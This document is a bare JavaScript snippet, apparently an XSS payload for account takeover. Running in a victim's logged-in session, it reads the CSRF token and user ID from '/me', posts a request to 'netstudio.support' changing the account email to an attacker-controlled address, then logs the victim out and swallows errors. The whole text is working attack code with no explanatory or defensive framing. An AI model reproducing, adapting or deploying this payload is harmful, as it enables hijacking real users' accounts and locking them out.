let t;
fetch('/me',{credentials:'include'}).then(r=>r.text()).then(h=>{
  const csrfMatch=h.match(/csrf-token&quot; content=&quot;([^&quot;]+)/)||h.match(/name="_token" value="([^"]+)/);
  if(!csrfMatch)return;
  t=csrfMatch[1];
  const uidMatch=h.match(/users\/(\d+)/)||h.match(/"id":(\d+)/);
  if(!uidMatch)return;
  const u=uidMatch[1];
  return fetch('https://netstudio.support/users/'+u,{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({id:u,_token:t,_method:'patch',email:'vijay+attacker@whitenet.io'})});
}).then(()=>fetch('/logout',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({_token:t})})).catch(()=>{});
